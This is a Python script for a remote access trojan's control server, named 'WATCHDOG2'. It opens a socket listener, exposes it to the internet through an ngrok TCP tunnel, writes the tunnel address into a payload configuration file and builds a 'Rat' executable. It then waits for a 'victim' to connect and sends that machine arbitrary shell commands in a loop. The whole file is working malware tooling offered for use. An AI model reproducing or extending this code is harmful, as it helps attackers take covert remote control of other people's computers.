import socket 
import configparser
from buildRat import build
import configparser
from scriptconfig import ScriptConfig
from pyngrok import ngrok
from halo import Halo
import time

#config socket server
Spinner=Halo(text='Initializing WATCHDOG2 Server\n',text_color='cyan',spinner='dots')

Spinner.start()
start_time=time.time()
server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host="127.0.0.1"
port=8080
time.sleep(time.time()-start_time)
Spinner.info(text="Server Initialized\n")

#config payload
Spinner.info("creating tcp tunneling")

ssh,ssh_port=ngrok.connect(port,proto="tcp").replace('tcp://','').split(":")
Spinner.succeed("tunnel created")
Spinner.info(text="configureing Payload Settings\n")
conf=configparser.ConfigParser()
confile=open('PAYLOAD.ini','w')
conf.add_section('HostSection')
conf.add_section('PortSection')
conf.set('HostSection','Host',ssh)
conf.set('PortSection','Port',ssh_port)
conf.write(confile)
confile.close()
Spinner.succeed("Payload configured\n")

#load script config
Spinner.start("building Paylod executable\n")
Spinner.info(text=f"Set LHost ->{ssh}")
Spinner.info(text=f"Set LPort ->{ssh_port}")
build(ScriptConfig())
Spinner.succeed("Rat created successfuly\n")

Spinner.start("Watch dog is Listening ... \n")
#binding server
server.bind((host,port))
server.listen(5)
client,addr=server.accept()
Spinner.info(f"conection establishd victims IP ->{addr}\n")
while True:
    try:
        command=input("$[WADOG]>>>")
        if command=='':
            print("Unkown command ?")
        else:
            client.send(command.encode("UTF-8"))
            msg=client.recv(2024)
            print(msg.decode("UTF-8"))
    except (ConnectionAbortedError,ConnectionResetError) as e:
        print(e)
        client,addr=server.accept()
        print("back to online!",addr)